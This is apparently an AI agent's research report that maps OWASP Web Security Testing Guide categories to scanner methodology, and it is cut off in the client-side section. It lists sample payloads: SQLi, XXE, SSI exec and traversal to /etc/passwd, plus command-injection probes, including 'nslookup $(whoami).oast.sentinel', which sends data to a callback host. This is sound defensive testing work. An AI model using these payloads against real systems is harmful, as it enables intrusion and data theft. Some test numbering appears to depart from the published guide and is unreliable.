# Comprehensive Research Report: Modern Web Security Testing Standards, Advanced Research Topics, and Proxy Tool Ecosystems

**Milestone**: M1 — Global Security Tool Research & Coverage Taxonomy  
**Agent**: Explorer M1-1 (`.agents/explorer_m1_1`)  
**Target Platform**: SENTINEL V6 Workstation  
**Date**: 2026-08-19  

---

## 1. Observation

### 1.1 Context & Standards Landscape
Modern application security testing requires coverage across three foundational dimensions:
1. **Authoritative Standardized Methodologies**: OWASP Web Security Testing Guide (WSTG v4.2 / v5.0) and OWASP API Security Top 10 (2023).
2. **Advanced Exploit & Vulnerability Research**: Cutting-edge vulnerability classes pioneered by PortSwigger Research and the wider security community (HTTP Request Smuggling, Web Cache Poisoning/Deception, DOM XSS & Client-side Prototype Pollution, OAuth/OIDC flaws, JWT attacks, SSRF, SSTI, Race Conditions, GraphQL attacks, Host Header Injection, Path Traversal, XXE, Insecure Deserialization).
3. **Core Interception Proxy & Testing Tool Architectures**: Architectural models, automation interfaces, extensibility mechanisms, and performance profiles of modern proxy suites (Caido, OWASP ZAP, Burp Suite Professional/Enterprise).

---

### 1.2 OWASP Web Security Testing Guide (WSTG v4.2 / v5.0) Complete Taxonomy

The OWASP WSTG represents the industry gold standard for web application penetration testing. Below is the exhaustive categorization, covering all 12 test categories, test IDs, targets, methodologies, automation profiles, and false-positive controls.

| Category Code | Category Name | Test Count | Primary Test Focus |
|---|---|---|---|
| **INFO** | Information Gathering | 10 | Reconnaissance, metadata, search engines, web server/tech fingerprinting, application map |
| **CONF** | Configuration & Deployment Management | 11 | Network/infrastructure config, TLS, subdomains, backup files, HTTP methods, HSTS, CORS |
| **IDNT** | Identity Management | 5 | Role definitions, user registration, account provisioning, account enumeration, weak usernames |
| **AUTH** | Authentication Testing | 10 | Credential transport, default credentials, lockout, auth bypass, remember me, 2FA/MFA, password reset |
| **ATHZ** | Authorization Testing | 4 | Directory traversal/file include, BFLA, BOLA/IDOR, privilege escalation (vertical/horizontal) |
| **SESS** | Session Management Testing | 9 | Session token attributes, fixation, hijacking, exposure, CSRF, logout functionality, session timeouts |
| **INPV** | Input Validation Testing | 19 | Reflected/Stored XSS, SQLi, NoSQLi, LDAP, Command Injection, SSRF, XXE, SSTI, HTTP Smuggling |
| **ERRR** | Error Handling | 2 | Error code analysis, stack trace leakages, unhandled exception disclosures |
| **CRYP** | Cryptography | 4 | Weak TLS ciphers, sensitive data in transit, broken encryption padding, insecure random generators |
| **CLNT** | Client-Side Testing | 13 | DOM-based XSS, JavaScript execution, HTML5 WebSockets/WebStorage, CSP bypass, Cross-origin messaging |
| **APIT** | API Testing | 3 | REST API endpoints, GraphQL endpoints, SOAP/XML web services, authorization and schema discovery |
| **BUSL** | Business Logic Testing | 9 | Business logic bypass, workflow circumvention, race conditions, limit overruns, integrity checks |

#### Detailed Analysis of All 12 WSTG Categories and Test IDs

#### 1. Information Gathering (WSTG-INFO)
- **WSTG-INFO-01: Conduct Search Engine Discovery and Reconnaissance for Information Leakage**
  - *Methodology*: Passive search engine dorking (`site:target.com filetype:pdf`, `intitle:"index of"`, `inurl:admin`).
  - *Automation*: Passive ingestion, OSINT API lookups (Shodan, Censys, Google Custom Search API).
  - *FP Mitigation*: Domain ownership verification, validation of indexed document relevance.
- **WSTG-INFO-02: Fingerprint Web Server**
  - *Methodology*: Header analysis (`Server`, `X-Powered-By`), protocol behavior (HTTP/2 SETTINGS frame ordering, TLS cipher suites, TCP/IP stack fingerprinting), custom error page responses.
  - *Automation*: Passive traffic inspection + differential probe response matching.
  - *FP Mitigation*: Strip/spoofed header handling; correlate header clues with TLS/TCP behavioral signatures.
- **WSTG-INFO-03: Review Webserver Metafiles for Information Leakage**
  - *Methodology*: Active fetching of `/robots.txt`, `/sitemap.xml`, `/.well-known/security.txt`, `/crossdomain.xml`, `/.well-known/assetlinks.json`.
  - *Automation*: Active spidering precondition step with strict URL normalization.
  - *FP Mitigation*: Verify 200 OK status returns genuine text/plain or XML, not soft-404 HTML error templates.
- **WSTG-INFO-04: Enumerate Applications on Webserver**
  - *Methodology*: Virtual host brute-forcing (Host header mutations), SNI probing, reverse IP DNS lookups.
  - *Automation*: Active fuzzer using dictionary of common subdomains/vhosts with baseline diffing.
  - *FP Mitigation*: Filter wildcard DNS responses and generic default catch-all virtual hosts via response body hashing.
- **WSTG-INFO-05: Review Webpage Content for Information Leakage**
  - *Methodology*: Parse HTML comments (`<!-- -->`), JS source code, inline debug data, internal IP addresses, staging URLs, author email addresses.
  - *Automation*: Passive stream parser extracting regex patterns (`/(?:api[_-]?key|secret|token|password)/i`).
  - *FP Mitigation*: Entropy checks and AST verification to avoid flagging minified variable names or placeholder documentation.
- **WSTG-INFO-06: Identify Application Entry Points**
  - *Methodology*: Map all URLs, query parameters, body parameters (JSON, XML, form-urlencoded), headers (`X-Forwarded-*`, `User-Agent`, `Referer`), and WebSockets.
  - *Automation*: Interactive proxy passive harvesting + headless browser crawler (Katana style).
  - *FP Mitigation*: Canonical URL deduplication, path parameter parameterization (`/api/users/{id}`).
- **WSTG-INFO-07: Map Execution Paths Through Application**
  - *Methodology*: Trace stateful user workflows (e.g., checkout, onboarding, KYC) and state transitions.
  - *Automation*: Graph-based state machine reconstruction from proxy traffic.
  - *FP Mitigation*: Grouping redundant idempotent requests into single functional nodes.
- **WSTG-INFO-08: Fingerprint Web Application Framework**
  - *Methodology*: Identify cookies (`JSESSIONID`, `PHPSESSID`, `ASP.NET_SessionId`, `connect.sid`), DOM element signatures, framework-specific assets (`/wp-content/`, `/_next/static/`).
  - *Automation*: Passive regex and DOM fingerprinting engine.
  - *FP Mitigation*: Cross-validate multiple independent indicators (e.g., cookie name + asset structure + header).
- **WSTG-INFO-09: Fingerprint Web Application**
  - *Methodology*: Identify commercial off-the-shelf (COTS) or open-source web apps (e.g., Jira, WordPress, Grafana, Jenkins) via known static file hashes and endpoints.
  - *Automation*: Hashes of favicon (`favicon.ico` MD5/MurmurHash), `/manifest.json`, script tags.
  - *FP Mitigation*: Hash matching against curated ground-truth database.
- **WSTG-INFO-10: Map Application Architecture**
  - *Methodology*: Deduce reverse proxies, load balancers, CDNs, WAFs, API gateways, and microservices via header analysis (`Via`, `X-Cache`, `CF-Ray`), parser discrepancies, and timing differentials.
  - *Automation*: Passive header topology grapher + non-destructive probe delays.
  - *FP Mitigation*: Ignore unverified client-supplied headers; rely on response headers generated by infrastructure.

#### 2. Configuration and Deployment Management Testing (WSTG-CONF)
- **WSTG-CONF-01: Test Network Infrastructure Configuration**
  - *Methodology*: Port scanning, admin interface exposure check, default service banners.
  - *Automation*: Active TCP/TLS connector.
  - *FP Mitigation*: Restrict to explicit in-scope IP/CIDR boundaries.
- **WSTG-CONF-02: Test Application Platform Configuration**
  - *Methodology*: Review server misconfigurations (directory indexing enabled, default welcome pages, management consoles like `/manager/html`, `/solr/`, `/actuator/health`).
  - *Automation*: Active dictionary probe with strict content-type and body signature verification.
  - *FP Mitigation*: Distinguish custom 404 pages from valid administrative consoles.
- **WSTG-CONF-03: Test File Extensions Handling for Sensitive Information**
  - *Methodology*: Request files with alternative/backup extensions: `.bak`, `.old`, `.orig`, `~`, `.swp`, `.zip`, `.tar.gz`, `.sql`.
  - *Automation*: Parameterized fuzzer appending suffixes to identified script endpoints.
  - *FP Mitigation*: Binary content verification (e.g., magic bytes for ZIP/GZ/SQL) or plain-text code reflection.
- **WSTG-CONF-04: Review Old Backup and Unreferenced Files for Sensitive Information**
  - *Methodology*: Fuzz for unlinked configuration files (`.env`, `config.php.bak`, `web.config`, `settings.json`, `.git/HEAD`, `.svn/entries`).
  - *Automation*: Active scan rule targeting webroot and known directories.
  - *FP Mitigation*: For `.git/HEAD`, check for `ref: refs/`; for `.env`, verify `KEY=VALUE` structural syntax.
- **WSTG-CONF-05: Enumerate Infrastructure and Application Admin Interfaces**
  - *Methodology*: Search for administrative paths (`/admin`, `/administrator`, `/wp-admin`, `/backend`, `/cpanel`).
  - *Automation*: Context-aware wordlist fuzzing.
  - *FP Mitigation*: Ensure response status is 200 or 401/403 with real login forms, not generic single-page app (SPA) fallback HTML.
- **WSTG-CONF-06: Test HTTP Methods**
  - *Methodology*: Send `OPTIONS`, `PUT`, `DELETE`, `TRACE`, `TRACK`, `CONNECT`, `PATCH`, `PROPFIND`, `DEBUG`. Check if `TRACE` reflects request headers (XST) or `PUT` allows arbitrary upload.
  - *Automation*: Active probe sending each method to static and dynamic endpoints.
  - *FP Mitigation*: For `PUT`, test with a unique random-named non-executable test canary file (`.txt`) and verify deletion.
- **WSTG-CONF-07: Test HTTP Strict Transport Security (HSTS)**
  - *Methodology*: Check `Strict-Transport-Security` header in HTTPS responses. Verify `max-age` (>= 31536000), `includeSubDomains`, and `preload`.
  - *Automation*: Passive scan check.
  - *FP Mitigation*: Only evaluate over HTTPS; report informational if site is purely an internal intranet.
- **WSTG-CONF-08: Test RIA Cross Domain Policy**
  - *Methodology*: Inspect `/crossdomain.xml` and `/clientaccesspolicy.xml` for wildcard domain authorizations (`<allow-access-from domain="*"/>`).
  - *Automation*: Active GET probe + XML parser.
  - *FP Mitigation*: Confirm file is served with valid XML MIME type and domain is wildcarded.
- **WSTG-CONF-09: Test File Permission**
  - *Methodology*: Test for unauthorized write/delete permissions on webroot assets or sensitive configuration directories.
  - *Automation*: Active non-destructive write attempts.
  - *FP Mitigation*: Ensure canary writes do not overwrite existing application assets.
- **WSTG-CONF-10: Test for Subdomain Takeover**
  - *Methodology*: Identify DNS CNAME records pointing to unclaimed external services (GitHub Pages, AWS S3, Heroku, Azure Traffic Manager, Zendesk, Fastly).
  - *Automation*: Active DNS query + HTTP request checking for service-specific unclaimed bucket signatures (e.g. "There is no app configured at that hostname").
  - *FP Mitigation*: Strict signature database matching specific cloud provider error strings.
- **WSTG-CONF-11: Test Cloud Storage**
  - *Methodology*: Identify AWS S3, Google Cloud Storage, Azure Blob URLs; test for unauthenticated read/write/list permissions (`ListBucket`, `PutObject`).
  - *Automation*: Active REST probe with signed/unsigned requests.
  - *FP Mitigation*: Validate XML response schema matches standard S3 `<ListBucketResult>` or GCS bucket listing.

#### 3. Identity Management Testing (WSTG-IDNT)
- **WSTG-IDNT-01: Test Role Definitions**
  - *Methodology*: Enumerate valid system roles (Admin, Moderator, Standard User, Billing, Auditor) and their intended privilege matrix.
  - *Automation*: Semi-automated role mapping in IRA+ (Identity & Role Authorization) matrix.
  - *FP Mitigation*: Requires explicit multi-identity test credentials configured by operator.
- **WSTG-IDNT-02: Test User Registration Process**
  - *Methodology*: Test for registration spoofing, email verification bypass, default role assignment tampering (e.g. `{"role": "admin"}` in registration POST).
  - *Automation*: Active parameter fuzzer on registration endpoints.
  - *FP Mitigation*: Compare registration response data and verify elevated privileges on subsequent authenticated requests.
- **WSTG-IDNT-03: Test Account Provisioning Process**
  - *Methodology*: Verify admin workflows for creating, disabling, and assigning permissions to sub-accounts.
  - *Automation*: State-machine test checking if disabled users can still perform actions.
  - *FP Mitigation*: Measure active session invalidation vs cached token expiration.
- **WSTG-IDNT-04: Testing for Account Enumeration and Guessable User Account**
  - *Methodology*: Analyze differential responses on login, password reset, and registration endpoints (status codes, error messages, response times, response body length).
  - *Automation*: Statistical differential fuzzer calculating Levenshtein distance and response latency distributions.
  - *FP Mitigation*: Account for rate limiting, CAPTCHA activation, and network jitter via baseline noise calibration.
- **WSTG-IDNT-05: Testing for Weak or Unenforced Username Policy**
  - *Methodology*: Test acceptance of trivial usernames, special characters, whitespace padding, case-insensitivity collisions (`admin` vs `Admin`).
  - *Automation*: Active registration fuzzing with unicode/whitespace variations.
  - *FP Mitigation*: Verify whether database normalizes usernames before lookup.

#### 4. Authentication Testing (WSTG-AUTH)
- **WSTG-AUTH-01: Testing for Credentials Transported over an Encrypted Channel**
  - *Methodology*: Check if login forms submit over HTTP, or if HTTPS pages load insecure form action endpoints (`<form action="http://...">`).
  - *Automation*: Passive DOM parser and traffic inspector.
  - *FP Mitigation*: Verify scheme of form `action` URL and enclosing page.
- **WSTG-AUTH-02: Testing for Default Credentials**
  - *Methodology*: Test standard default username/password combinations (e.g., `admin:admin`, `root:toor`, `tomcat:s3cret`) against known COTS/administrative interfaces.
  - *Automation*: Targeted active dictionary attack bounded by strict rate limits.
  - *FP Mitigation*: Confirm successful authentication via redirect to dashboard, cookie issuance, or 200 OK dashboard content.
- **WSTG-AUTH-03: Testing for Weak Lock Out Mechanism**
  - *Methodology*: Submit N invalid login attempts (e.g. 5, 10, 20) and observe if account locks, requires CAPTCHA, or delays response. Check for bypasses: `X-Forwarded-For` header spoofing, username casing, password spraying.
  - *Automation*: Controlled active runner with configurable attempt threshold.
  - *FP Mitigation*: Prevent accidental production lockout via operator-designated test user accounts.
- **WSTG-AUTH-04: Testing for Bypassing Authentication Schema**
  - *Methodology*: Test direct URL access to protected resources, forced browsing, parameter tampering (`authenticated=true`), HTTP verb tampering, SQLi auth bypass (`admin'--`).
  - *Automation*: Differential active runner comparing unauthenticated request response to authenticated baseline.
  - *FP Mitigation*: Ensure protected pages return actual private data, not public login redirects.
- **WSTG-AUTH-05: Testing for Vulnerabilities in Remember Password and Auto-Login**
  - *Methodology*: Analyze remember-me tokens (predictability, static hashes of username/email, lack of revocation upon password change).
  - *Automation*: Token capture + entropy calculation + re-test after password update.
  - *FP Mitigation*: Differentiate secure HMAC-SHA256 random tokens from insecure base64(username:md5(pass)).
- **WSTG-AUTH-06: Testing for Browser Cache Weaknesses**
  - *Methodology*: Check `Cache-Control` (`no-store`, `no-cache`, `must-revalidate`) and `Pragma: no-cache` on authenticated sensitive responses.
  - *Automation*: Passive response header check on sensitive endpoints.
  - *FP Mitigation*: Scope check strictly to authenticated pages containing PII or financial data.
- **WSTG-AUTH-07: Testing for Weak Password Policy**
  - *Methodology*: Submit short, simple, or common dictionary passwords during registration or password change.
  - *Automation*: Active mutation runner submitting weak password samples.
  - *FP Mitigation*: Verify backend validation response vs client-side HTML5 validation.
- **WSTG-AUTH-08: Testing for Weak Security Question / Answer**
  - *Methodology*: Assess predictability, lack of entropy, and bruteforce resistance of security questions.
  - *Automation*: Passive inspection + wordlist bruteforce.
  - *FP Mitigation*: Manual review of custom security question schemas.
- **WSTG-AUTH-09: Testing for Weak Password Reset and Recovery Functionality**
  - *Methodology*: Analyze reset token entropy, expiration, single-use enforcement, Host header poisoning in reset emails, and leakages via URL query strings.
  - *Automation*: Active reset token generator + OAST Host header poisoning probe.
  - *FP Mitigation*: Confirm reset token cannot be reused once consumed or expired.
- **WSTG-AUTH-10: Testing for Multi-Factor Authentication (MFA)**
  - *Methodology*: Test for MFA bypasses: direct navigation to post-MFA endpoints, manipulation of MFA success response (`{"success": true}`), reuse of TOTP tokens, brute-forcing 4/6-digit SMS/TOTP codes without rate limiting.
  - *Automation*: State transition fuzzing across Step 1 (password) and Step 2 (MFA).
  - *FP Mitigation*: Verify session token state transitions from `PRE_MFA` to `AUTHENTICATED`.

#### 5. Authorization Testing (WSTG-ATHZ)
- **WSTG-ATHZ-01: Testing Directory Traversal and File Inclusion**
  - *Methodology*: Test `../`, `..%2f`, nested encodings, absolute paths (`/etc/passwd`, `C:\Windows\win.ini`) in filename/path parameters.
  - *Automation*: Active fuzzer using path traversal dictionary + regex matching known OS signatures (`root:.*:0:0:`, `\[extensions\]`).
  - *FP Mitigation*: Avoid false positives on reflection by requiring structured regex matches of actual operating system configuration files.
- **WSTG-ATHZ-02: Testing for Bypassing Authorization Schema**
  - *Methodology*: Test horizontal and vertical authorization bypasses. Access User A's data using User B's session or unauthenticated request.
  - *Automation*: IRA+ Dual-Identity Differential Matrix (replay User A request with User B session and compare response body/status).
  - *FP Mitigation*: Exclude public endpoints, strip dynamic nonces/timestamps from diff comparison.
- **WSTG-ATHZ-03: Testing for Privilege Escalation**
  - *Methodology*: Test vertical escalation (standard user invoking admin functions `/api/admin/deleteUser`) and horizontal escalation (tenant A modifying tenant B assets).
  - *Automation*: Multi-session replay with role tagging.
  - *FP Mitigation*: Require verification that administrative operation was actually executed (e.g. database change or state change).
- **WSTG-ATHZ-04: Testing for Insecure Direct Object References (IDOR)**
  - *Methodology*: Substitute integer IDs, UUIDs, or hashes in REST endpoints (`GET /api/documents/1001` -> `GET /api/documents/1002`).
  - *Automation*: Pattern detection on identifier parameters + multi-token cross-user replay.
  - *FP Mitigation*: Verify response contains unique record data belonging strictly to the target object.

#### 6. Session Management Testing (WSTG-SESS)
- **WSTG-SESS-01: Testing for Session Management Schema**
  - *Methodology*: Analyze session token issuance, transport, storage, and predictability.
  - *Automation*: Statistical entropy evaluation (Shannon entropy, Chi-square test) across 10,000 generated tokens.
  - *FP Mitigation*: Ensure test samples are collected under identical conditions.
- **WSTG-SESS-02: Testing for Cookie Attributes**
  - *Methodology*: Inspect `Set-Cookie` headers for `Secure`, `HttpOnly`, `SameSite` (`Strict`/`Lax`/`None`), `Path`, and `Domain` attributes.
  - *Automation*: Passive response header analyzer.
  - *FP Mitigation*: Differentiate session cookies from non-sensitive tracking/preference cookies.
- **WSTG-SESS-03: Testing for Session Fixation**
  - *Methodology*: Establish session ID as unauthenticated user, log in, and verify if session ID is renewed or remains identical.
  - *Automation*: Automated 3-step test: `GET /login` -> capture cookie -> `POST /login` -> compare cookie.
  - *FP Mitigation*: Ensure all cookie keys matching session identifiers are tracked and compared.
- **WSTG-SESS-04: Testing for Exposed Session Variables**
  - *Methodology*: Check for session tokens in URLs (`GET /dashboard?sessionid=xyz`), Referer headers, browser history, or logs.
  - *Automation*: Passive URL query parser and Referer header inspector.
  - *FP Mitigation*: Filter out non-identifying state parameters (e.g., pagination or tab indices).
- **WSTG-SESS-05: Testing for Cross Site Request Forgery (CSRF)**
  - *Methodology*: Check state-changing POST/PUT/DELETE requests for anti-CSRF tokens, SameSite cookie protection, and custom header requirements (`X-Requested-With`).
  - *Automation*: Active replay without CSRF token or with altered token + SameSite attribute audit.
  - *FP Mitigation*: Determine if endpoint accepts JSON content-type (which requires CORS preflight) vs form-urlencoded.
- **WSTG-SESS-06: Testing for Logout Functionality**
  - *Methodology*: Log in, capture session token, issue logout request, then replay authenticated request with old token to verify server-side invalidation.
  - *Automation*: Active sequential test: Login -> Capture -> Logout -> Replay -> Assert 401/403/Redirect.
  - *FP Mitigation*: Ensure replayed request targets an authenticated endpoint that actually requires valid session data.
- **WSTG-SESS-07: Testing Session Timeout**
  - *Methodology*: Measure idle session timeout (inactivity period after which token expires) and absolute session timeout.
  - *Automation*: Automated delayed replay test (t=0, t=15m, t=30m, t=60m).
  - *FP Mitigation*: Run within local lab or staging environments to avoid unexpected session terminations.
- **WSTG-SESS-08: Testing for Session Puzzling / Variable Overloading**
  - *Methodology*: Populate session variables in one context (e.g., password reset phase) and access another context (e.g., profile editor) that mistakenly reuses the same session variable name.
  - *Automation*: Cross-endpoint parameter mutation and state sequence replay.
  - *FP Mitigation*: Map application session state variable graph.
- **WSTG-SESS-09: Testing for Session Hijacking**
  - *Methodology*: Test MITM resistance, token interception, predictability, and lack of client binding (IP/User-Agent fingerprint binding).
  - *Automation*: Replay captured session token from simulated distinct IP and client headers.
  - *FP Mitigation*: Account for mobile clients with dynamic IP routing.

#### 7. Input Validation Testing (WSTG-INPV)
- **WSTG-INPV-01: Testing for Reflected Cross Site Scripting (XSS)**
  - *Methodology*: Inject unique alphanumeric canary strings with special characters (`<sentinel"'>`) into parameters and inspect response body context (HTML body, attribute, script block, event handler).
  - *Automation*: Context-aware injection engine using AST/HTML parser.
  - *FP Mitigation*: Verify that unescaped executable characters break out of context.
- **WSTG-INPV-02: Testing for Stored Cross Site Scripting (XSS)**
  - *Methodology*: Submit unique canary payloads to input endpoints and crawl/inspect stored display endpoints.
  - *Automation*: Two-phase scanner: Phase 1 injection with UUID canary -> Phase 2 spidering and DOM analysis.
  - *FP Mitigation*: Track injection-to-sink mapping in Security Context Graph.
- **WSTG-INPV-03: Testing for HTTP Parameter Pollution (HPP)**
  - *Methodology*: Inject duplicate parameters (`?id=1&id=2`) to test backend vs WAF parameter precedence (first, last, concatenated, array).
  - *Automation*: Active fuzzer sending dual-parameter requests.
  - *FP Mitigation*: Verify semantic impact on backend SQL query or authorization check.
- **WSTG-INPV-04: Testing for SQL Injection**
  - *Methodology*: Test in-band error-based (`'`, `"` syntax errors), union-based (`UNION SELECT ...`), boolean-based (`AND 1=1` vs `AND 1=2`), time-based (`WAITFOR DELAY`, `pg_sleep()`, `sleep()`), and out-of-band (OAST DNS lookups via `xp_dirtree`, `UTL_INADDR`).
  - *Automation*: Multi-stage SQLi engine: Error probe -> Boolean differential probe -> Time-based probe -> OAST proof.
  - *FP Mitigation*: Time-based checks must calibrate against baseline latency jitter (e.g., 3 standard deviations) and verify with multiple distinct sleep durations (e.g. 5s and 10s).
- **WSTG-INPV-05: Testing for LDAP Injection**
  - *Methodology*: Inject LDAP filter metacharacters (`*`, `(`, `)`, `&`, `|`, `!`) to alter search queries.
  - *Automation*: Active mutation runner with LDAP error pattern matching.
  - *FP Mitigation*: Check for specific LDAP error messages (`LDAPException`, `Invalid DN syntax`).
- **WSTG-INPV-06: Testing for XML Injection**
  - *Methodology*: Inject XML metacharacters (`<`, `>`, `&`, `<!--`, `]]>`) into XML payloads to alter document structure.
  - *Automation*: Active XML structure fuzzer.
  - *FP Mitigation*: Verify XML parsing error vs structural modification.
- **WSTG-INPV-07: Testing for XML External Entity (XXE) Injection**
  - *Methodology*: Inject external entity definitions (`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://oast-token.sentinel.internal"> ]>`) referencing local files or OAST listener.
  - *Automation*: Active payload injector with dedicated OAST DNS/HTTP correlation.
  - *FP Mitigation*: Proof strictly established via out-of-band callback receipt or file content disclosure (`root:x:0:0`).
- **WSTG-INPV-08: Testing for SSI Injection**
  - *Methodology*: Inject Server-Side Include directives (`<!--#exec cmd="ls" -->`, `<!--#echo var="DATE_LOCAL" -->`).
  - *Automation*: Active fuzzer looking for executed output reflection.
  - *FP Mitigation*: Distinguish comment reflection from evaluated SSI expressions.
- **WSTG-INPV-09: Testing for XPath Injection**
  - *Methodology*: Inject XPath syntax (`' or '1'='1`, `' or count(parent::*)=0 or 'a'='b`) into XML query fields.
  - *Automation*: Boolean differential analysis of XML-backed responses.
  - *FP Mitigation*: Verify boolean true/false query divergences.
- **WSTG-INPV-10: Testing for IMAP/SMTP Injection**
  - *Methodology*: Inject CRLF sequences (`%0d%0a`) and SMTP commands (`MAIL FROM:`, `RCPT TO:`, `DATA`) into mail-sending parameters.
  - *Automation*: Active fuzzer + OAST mail listener.
  - *FP Mitigation*: Confirm receipt of injected recipient email via OAST SMTP listener.
- **WSTG-INPV-11: Testing for Code Injection (Command Injection, Eval)**
  - *Methodology*: Inject shell metacharacters (`;`, `|`, `&`, `` ` ``, `$(...)`, `\n`) and language eval constructs (`system()`, `Runtime.getRuntime().exec()`, `eval()`).
  - *Automation*: In-band command output extraction (`id`, `whoami`, `cat /etc/passwd`) + time delay (`sleep 10`) + OAST DNS (`nslookup $(whoami).oast.sentinel`).
  - *FP Mitigation*: Require matching command output or calibrated OAST callback with command output in DNS subdomain.
- **WSTG-INPV-12: Testing for Command Injection**
  - *Methodology*: Target OS command execution interfaces via shell argument injection and delimiter chaining.
  - *Automation*: Safe non-destructive probes (`echo <uuid>`, `sleep <n>`).
  - *FP Mitigation*: Verify canary UUID in stdout/stderr response.
- **WSTG-INPV-13: Testing for Format String Injection**
  - *Methodology*: Inject format specifiers (`%s`, `%x`, `%n`, `%p`, `{0}`, `{}`) into native or formatted string inputs.
  - *Automation*: Active fuzzer monitoring for server 500 crashes or memory leaks.
  - *FP Mitigation*: Filter out standard URL encoding `%20` false alarms.
- **WSTG-INPV-14: Testing for Incubated Vulnerability (Second-Order Injection)**
  - *Methodology*: Inject payloads into data entry points (e.g. user profile name), then trigger downstream background jobs or administrative dashboards to observe execution.
  - *Automation*: Context Graph cross-endpoint correlation engine.
  - *FP Mitigation*: Track payload canary ID across all subsequent requests and responses.
- **WSTG-INPV-15: Testing for HTTP Splitting / Smuggling**
  - *Methodology*: Inject CRLF (`\r\n`) into headers (`Set-Cookie`, `Location`) and test HTTP request desynchronization.
  - *Automation*: Protocol-level desync engine with raw socket manipulation.
  - *FP Mitigation*: Verify downstream response queue misalignment.
- **WSTG-INPV-16: Testing for HTTP Incoming Request (SSRF)**
  - *Methodology*: Supply internal IPs (`127.0.0.1`, `169.254.169.254`, `10.0.0.0/8`), cloud metadata hostnames, and unique OAST callback URLs into URL/fetch parameters.
  - *Automation*: Active injector + OAST DNS/HTTP server with payload token tracking.
  - *FP Mitigation*: Confirm internal service banner disclosure or cryptographic OAST interaction proof.
- **WSTG-INPV-17: Testing for Host Header Injection**
  - *Methodology*: Mutate `Host` header (`Host: attacker.com`, `X-Forwarded-Host: attacker.com`) and observe if host is reflected in password reset links, scripts, or redirects.
  - *Automation*: Active header fuzzer with OAST canary domain.
  - *FP Mitigation*: Check if reflected link actually leads to external attacker-controlled domain.
- **WSTG-INPV-18: Testing for Server-Side Template Injection (SSTI)**
  - *Methodology*: Inject mathematical expressions (`${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`) and observe mathematical evaluation (`49`).
  - *Automation*: Polyglot template decision tree injector.
  - *FP Mitigation*: Confirm evaluated result `49` appears where `${7*7}` was injected, while non-executable strings `${abc}` do not evaluate.
- **WSTG-INPV-19: Testing for Server-Side JavaScript / Prototype Pollution**
  - *Methodology*: Inject `__proto__`, `constructor.prototype` JSON properties (`{"__proto__": {"polluted": true}}`) into JSON endpoints and test if prototype property reflects globally.
  - *Automation*: Differential JSON fuzzer with secondary probe checking property reflection.
  - *FP Mitigation*: Ensure polluted property was not merely echoed back as a standard JSON key.

#### 8. Testing for Error Handling (WSTG-ERRR)
- **WSTG-ERRR-01: Testing for Improper Error Handling**
  - *Methodology*: Send malformed inputs (invalid JSON, null bytes `%00`, unexpected types `id[]=1`, excessively large strings) to trigger unhandled exceptions.
  - *Automation*: Passive and active scanner scanning for stack traces, framework error templates (Django debug screen, Rails error page, Spring Whitelabel Error Page, ASP.NET yellow screen).
  - *FP Mitigation*: Match specific stack trace signatures (`at com.example...`, `Traceback (most recent call last):`, `File "...", line ...`).
- **WSTG-ERRR-02: Testing for Error Codes**
  - *Methodology*: Analyze HTTP status codes and custom application error codes for information leaks or inconsistent state disclosure.
  - *Automation*: Passive response code auditor.
  - *FP Mitigation*: Correlate error codes with business logic context.

#### 9. Testing for Cryptography (WSTG-CRYP)
- **WSTG-CRYP-01: Testing for Weak Transport Layer Security (TLS)**
  - *Methodology*: Test SSLv2, SSLv3, TLS 1.0, TLS 1.1 support, weak ciphers (RC4, 3DES, EXPORT, NULL, CBC mode ciphers susceptible to POODLE/Lucky13), certificate validity, and certificate chain.
  - *Automation*: Active TLS handshake probe evaluating supported cipher suites and protocols.
  - *FP Mitigation*: Match against NIST SP 800-52 and Mozilla Modern TLS guidelines.
- **WSTG-CRYP-02: Testing for Padding Oracle**
  - *Methodology*: Mutate ciphertext bytes in CBC mode encrypted parameters (e.g. cookies) and analyze differential responses (padding error vs decryption error vs valid ciphertext).
  - *Automation*: Active cryptographic oracle fuzzer analyzing byte mutations and timing differences.
  - *FP Mitigation*: Strict statistical verification of padding oracle responses.
- **WSTG-CRYP-03: Testing for Sensitive Information Sent via Unencrypted Channels**
  - *Methodology*: Detect transmission of credentials, PII, payment info, tokens over unencrypted HTTP, or in URL query strings of HTTPS requests.
  - *Automation*: Passive traffic scanner with DLP regex pattern matching.
  - *FP Mitigation*: Restrict alerts to high-confidence PII/credential patterns.
- **WSTG-CRYP-04: Testing for Weak Encryption**
  - *Methodology*: Identify use of broken hash algorithms (MD5, SHA1 for signatures), weak symmetric ciphers (DES, RC4), or insufficient RSA key lengths (< 2048 bits).
  - *Automation*: Cryptographic artifact inspection in certificates, JWT tokens, and exported keys.
  - *FP Mitigation*: Contextual assessment (e.g. MD5 used for checksum vs password hashing).

#### 10. Client-Side Testing (WSTG-CLNT)
- **WSTG-CLNT-01: Testing for DOM-Based Cross Site Scripting**
  - *Methodology*: Identify client-side JavaScript sources (`location.search`, `location.hash`, `document.referrer`, `window.name`, `postMessage`) flowing into execution sinks (`innerHTML`, `eval`, `document.write`, `setTimeout`, `location.href`).
  - *Automation*: Headless browser (Chromium/Playwright) with instrumented DOM taint tracking and prototype monkey-patching.
  - *FP Mitigation*: Verify that payload executes in headless browser sandbox and triggers a monitored execution sink.
- **WSTG-CLNT-02: Testing for JavaScript Execution**
  - *Methodology*: Review client-side JS files for unsafe execution constructs, hardcoded secrets, and debug functions.
  - *Automation*: Client script AST scanner and secret detector.
  - *FP Mitigation*: Distinguish minified variable names from true secrets via Shannon entropy and regex verification.
- **WSTG-CLNT-03: Testing for HTML Injection**
  - *Methodology*: Inject HTML tags (`<b>`, `<h1>`, `<iframe>`, `<img>`) into parameters reflected in the client DOM.
  - *Automation*: DOM AST comparison before and after payload injection.
  - *FP Mitigation*: Verify DOM node creation vs text node representation.
- **WSTG-CLNT-04: Testing for Client-Side URL Redirection**
  - *Methodology*: Inject target URLs (`https://attacker.com`, `//attacker.com`, `javascript:alert(1)`) into parameters read by client-side navigation scripts (`window.location = param`).
  - *Automation*: Headless browser navigation interception.
  - *FP Mitigation*: Verify actual navigation event to external domain.
- **WSTG-CLNT-05: Testing for CSS Injection**
  - *Methodology*: Inject CSS selectors and rules (`body{background-image:url(...)};`, `@import`) to extract sensitive text or exfiltrate CSRF tokens.
  - *Automation*: Active fuzzer injecting style constructs + OAST HTTP listener.
  - *FP Mitigation*: Verify CSS evaluation and external callback receipt.
- **WSTG-CLNT-06: Testing for Client-Side Resource Manipulation**
